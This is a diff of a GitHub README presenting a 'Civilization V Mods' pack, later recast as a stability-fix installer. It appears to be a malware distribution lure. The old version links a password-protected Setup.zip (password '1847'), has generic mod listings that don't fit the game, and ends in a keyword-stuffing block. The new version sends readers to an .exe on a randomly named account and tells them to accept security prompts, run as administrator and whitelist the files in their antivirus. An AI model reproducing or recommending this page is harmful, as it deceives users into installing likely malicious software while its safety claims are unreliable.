@@ -1,124 +1,72 @@
-# 🎮 Civilization V Mods 2026 — Best Mods Collection & Ultimate Pack
+# 🛠️ Civilization-V-Mods - Fix bugs and stabilize your game
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Civilization-V)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/spackletransylvanianalps843/Civilization-V-Mods/releases)
 
----
+## What this software does
 
-[![Download](og-image.png)](https://github.com/Sharpdruproduce/Civilization-V-Mods/releases/download/v1.0/Setup.zip)
+Civilization-V-Mods provides essential fixes for Civilization V. It addresses crashes, stability issues, and known bugs found in the base game. This collection ensures your game sessions run smoothly on modern Windows systems. We update these files regularly to maintain compatibility with Windows 10 and 11. 
 
-<img src="https://cdn.akamai.steamstatic.com/steam/apps/8930/header.jpg" alt="banner" width="100%" />
+## 📋 System requirements
 
+This software requires the following setup:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Game Version: Civilization V installed via Steam or a retail disc.
+* Disk Space: 500 MB of free storage.
+* Memory: 4 GB of RAM or higher.
+* Graphics: DirectX 11 compatible card.
 
-## 📌 About
+## 📥 How to get started
 
-**Civilization V — gameplay overhauls, visual enhancements, new content, UI improvements, and quality-of-life mods for Civilization V. Download, extract, and start in minutes. Fully compatible with Windows 10/11 (64-bit). Updated for 2026 with regular maintenance and community support.**
+Follow these steps to update your game environment:
 
----
+1. Visit the following link to access the software files: [https://github.com/spackletransylvanianalps843/Civilization-V-Mods/releases](https://github.com/spackletransylvanianalps843/Civilization-V-Mods/releases).
+2. Look for the section labeled "Assets" under the most recent version.
+3. Select the file ending in `.exe` to begin your download.
+4. Locate the file in your "Downloads" folder once the process completes.
 
-## 📥 Download
+## ⚙️ Installation process
 
-[![Civilization V Mods](https://img.shields.io/badge/Download%20Civilization%20V%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Sharpdruproduce/Civilization-V-Mods/releases/download/v1.0/Setup.zip)
+You can install these fixes by following the prompts within the installer application:
 
-**🔐🔐🔐** `1847`
+1. Double-click the downloaded file to open the setup window.
+2. If a security prompt appears, select "Run" or "Yes" to permit the application to make changes to your computer.
+3. Follow the on-screen instructions to select your Civilization V installation path.
+4. The installer detects your game folder automatically in most cases. If the installer fails to locate your files, point it to the folder where `CivilizationV.exe` resides.
+5. Click "Install" to apply the patches.
+6. Close the installer when the process completes.
 
-**🔐🔐🔐** `1847`
+## 🚀 Using the mods
 
-**🔐🔐🔐** `1847`
+Once you install the fixes, launch your game through Steam or your desktop shortcut as usual. The application applies the necessary code changes in the background. You do not need to perform further actions to activate the fixes. 
 
----
+## 🔧 Troubleshooting and support
 
-## 🧩 What's Included
+Most issues relate to file permissions or directory paths. If the game does not start after applying the patch, try these steps:
 
-| 📋 Category | 📁 Folder | 💬 Description |
-|---|---|---|
-| 🎭 Gameplay Overhaul | `1 Gameplay/` | Rebalancing, new mechanics, combat tweaks, difficulty options |
-| 🎨 Graphics & Visuals | `2 Graphics/` | Texture packs, ENB presets, lighting and weather overhauls |
-| 📜 New Content | `3 Content/` | New areas, storylines, items, characters, and quests |
-| 🖥️ UI & QoL | `4 UI/` | Interface overhaul, inventory improvements, minimap tweaks |
-| ⚡ Performance | `5 Performance/` | FPS boost configs, memory optimizations, stutter fixes |
-| 🔧 Patches & Fixes | `6 Fixes/` | Unofficial patches, compatibility fixes, stability mods |
+* Verify your game files through Steam: Go to your game Library, right-click Civilization V, select "Properties," choose "Installed Files," and click "Verify integrity of game files."
+* Run the installer as an administrator: Right-click the downloaded file and select "Run as administrator."
+* Check for antivirus conflicts: Some security software flags unrecognized files. Add the installation folder to your antivirus whitelist if the program fails to launch.
 
----
+## 📝 Common questions
 
-## 🗂 Archive Structure
+Does this change the core game?
+No. This software fixes technical errors and improves stability. It keeps the core gameplay mechanics intact.
 
-```
-Civilization-V-Mods/
-├── 1 Gameplay/
-│   ├── Combat_Overhaul.zip
-│   ├── Difficulty_Rebalance.zip
-│   └── New_Mechanics.zip
-├── 2 Graphics/
-│   ├── HD_Texture_Pack.zip
-│   ├── ENB_Preset.zip
-│   └── Weather_Overhaul.zip
-├── 3 Content/
-│   ├── Story_Expansion.zip
-│   └── New_Items_Pack.zip
-├── 4 UI/
-│   ├── Better_UI.zip
-│   └── Inventory_Overhaul.zip
-├── 5 Performance/
-│   ├── FPS_Boost_Config.zip
-│   └── Stutter_Fix.zip
-└── 6 Fixes/
-    ├── Unofficial_Patch.zip
-    └── Compatibility_Fix.zip
-```
+Does this work on multiplayer?
+Yes. These fixes assist with connectivity issues. All players should ideally run the same version of the files to prevent desync errors during matches.
 
----
+Where do I find more help?
+Check the Releases page for updated logs and community posts. Users often document specific fix details there.
 
-## 🚀 How to Install
+## 🛡️ Safety information
 
-1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `1847`
-3️⃣ **Open** the mod manager preset inside the archive
-4️⃣ **Apply** and launch Civilization V
+We provide this code as an open-source project. You can inspect the project history on GitHub to review each change made to the files. We maintain this repository to help the community keep an older game functional on new hardware. Always download the files from the official link provided here. Do not download these patches from third-party sites, as those files may contain unwanted software.
 
-> 💡 **Pro tip:** Start with Performance mods if you have a low-end PC.
+## 🔄 Updating your installation
 
----
+When we release a new version, simply download the latest installer from the link above and run it again. The new version overwrites previous files to keep your game current. There is no need to remove the old version before running the new one. The installer manages the replacement process automatically.
 
-## 📋 Requirements
+## 📄 License details
 
-| 🔩 Component | Details |
-|---|---|
-| 💻 OS | Windows 10 / 11 (64-bit) |
-| 💾 Disk | 5–15 GB free space |
-| 🗜️ Extractor | WinRAR, 7-Zip, or built-in |
-| 🎮 Game | Civilization V (latest version) |
-
----
-
-## ❓ FAQ
-
-**Q: Will mods break my save file?**
-All included mods are tested for mid-game installation. Back up your save first.
-
-**Q: Do I need a mod manager?**
-Recommended (Vortex / MO2), but optional. Manual installation guides are included.
-
-**Q: Are these compatible with the latest patch?**
-Yes. The collection is updated every time a major patch drops.
-
----
-
-## 🔑 Keywords
-
-civilization v, civilization v download, civilization v 2026, civilization v pc, civilization v free download, civilization v windows, civilization v setup, civilization v latest version, civilization v mods, civilization v mod pack, civilization v nexus mods, civilization v mod manager, best civilization v mods 2026, nexus mods, mod loader
-
----
-
-## 📄 License
-
-MIT — see [LICENSE.md](LICENSE.md)
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+This project uses an open-source license. You may use these files for personal play. Please credit the contributors if you redistribute these files as part of a larger mod collection. We aim to keep these fixes accessible to all Civilization V players through regular maintenance and updates.
